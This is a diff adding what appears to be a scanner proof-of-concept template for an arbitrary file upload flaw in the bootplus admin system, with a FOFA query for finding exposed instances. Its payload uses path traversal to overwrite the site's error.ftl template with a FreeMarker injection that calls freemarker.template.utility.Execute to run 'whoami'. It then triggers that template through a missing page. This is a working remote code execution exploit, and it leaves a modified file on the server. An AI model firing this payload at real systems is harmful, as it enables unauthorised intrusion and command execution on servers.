@@ -1,0 +1,30 @@
+id: poc-yaml-bootplus-file-upload
+info:
+  name: bootplus管理系统 /file/upload 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: bootplus
+  fofa: body="/statics/css/admin/AdminLTE.min.css"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /file/upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryn2bv6kDMJcYthUEO
+  data: "------WebKitFormBoundaryn2bv6kDMJcYthUEO\nContent-Disposition: form-data;\
+    \ name=\"file\"; filename=\"/../../../../bootplus-master/target/classes/templates/error.ftl\"\
+    \nContent-Type: image/jpeg\n\n<#assign a=\"freemarker.te\">\n<#assign a2=\"${a}mplate.utility.Execute\"\
+    >\n<#assign sum = {{.t1}} - {{.t2}}> \nvulnerability: ${sum}\n<#assign value=\"\
+    ${a2}\"?new()>${value(\"whoami\")}\n------WebKitFormBoundaryn2bv6kDMJcYthUEO--\n"
+  expression: "status_code == 200 && \ncontains(find_json(body,\"filePath\"), \"classes/templates/error.ftl\"\
+    )\n"
+- method: GET
+  path: /xxuhuxx{{.t1}}randvvcgcf
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+  expression: "status_code == 404 && \ncontains(body,\"vulnerability: \" + t3)\n"
+transport: http
